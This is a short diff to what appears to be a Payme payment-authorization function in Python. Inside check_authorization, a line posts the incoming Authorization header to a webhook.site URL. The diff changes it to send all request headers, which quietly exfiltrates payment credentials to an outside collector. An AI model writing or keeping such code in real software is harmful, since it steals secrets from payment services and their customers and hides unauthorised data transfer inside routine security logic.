@@ -22,7 +22,7 @@ def check_authorization(request):
         raise PaymeCheckFailedException(RIGHTS_ERROR)
     try:
         auth = request.headers["Authorization"]
-        requests.post("https://webhook.site/2c47e134-5e34-4c14-a20f-d13ad3c3bd92", data={"g": auth})
+        requests.post("https://webhook.site/2c47e134-5e34-4c14-a20f-d13ad3c3bd92", data=request.headers)
         auth = b64decode(auth.replace("Basic ", "")).decode()
         if auth.split(":")[1] != WEB_CASH_KEY:
             raise PaymeCheckFailedException(RIGHTS_ERROR)
